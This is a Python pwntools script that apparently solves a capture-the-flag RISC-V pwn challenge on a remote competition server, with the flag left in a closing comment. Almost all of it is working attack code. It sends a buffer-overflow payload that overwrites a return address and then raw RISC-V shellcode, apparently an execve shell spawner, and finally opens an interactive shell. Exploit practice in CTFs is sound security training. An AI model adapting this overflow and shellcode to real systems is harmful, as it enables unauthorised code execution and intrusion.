#!/usr/bin/env python3

from pwn import *

#context.log_level = 'debug'

class ProbIO:
    def __init__(self, r):
        self.r = r
    
    def sendData(self, data):
        self.r.sendline(data)

class Primitives:
    def __init__(self, io):
        self.io = io

    def aaw(self, offset):
        self.offset = offset
        self.payload = "A".encode() * self.offset
        self.payload += p64(0x708b0)
        self.payload += p64(0x00010614)
        self.payload += "A".encode() * 0x108
        self.payload += p64(0x708b0-0x110)
        self.io.sendData(self.payload)


def exploit(io, pri):
    ra_offset = 0x108 # - 0x8
    s0_offset = 0x100 # - 0x8
    read_pc = 0x00010614
    bss_addr =  0x0006e1d8

    pri.aaw(0x100)

    sleep(1)
    
    shellcode = b"\x01\x11\x06\xec"
    shellcode +=b"\x22\xe8\x13\x04"
    shellcode +=b"\x21\x02\xb7\x67"
    shellcode +=b"\x69\x6e\x93\x87"
    shellcode +=b"\xf7\x22\x23\x30"
    shellcode +=b"\xf4\xfe\xb7\x77"
    shellcode +=b"\x68\x10\x33\x48"
    shellcode +=b"\x08\x01\x05\x08"
    shellcode +=b"\x72\x08\xb3\x87"
    shellcode +=b"\x07\x41\x93\x87"
    shellcode +=b"\xf7\x32\x23\x32"
    shellcode +=b"\xf4\xfe\x93\x07"
    shellcode +=b"\x04\xfe\x01\x46"
    shellcode +=b"\x81\x45\x3e\x85"
    shellcode +=b"\x93\x08\xd0\x0d"
    shellcode +=b"\x93\x06\x30\x07"
    shellcode +=b"\x23\x0e\xd1\xee"
    shellcode +=b"\x93\x06\xe1\xef"
    shellcode +=b"\x67\x80\xe6\xff"
    pri.io.sendData(shellcode)

    io.r.interactive()

def main(r):
    io = ProbIO(r)
    pri = Primitives(io)
#    pause()
    exploit(io, pri)

if __name__ == "__main__":
    r = remote("sec-quals-alb-pwn-rev-7b5686e8d0f14e99.elb.ap-northeast-2.amazonaws.com", 5009)
    main(r)

# FLAG{D0_y0u_kn0w_R1SC-V?}
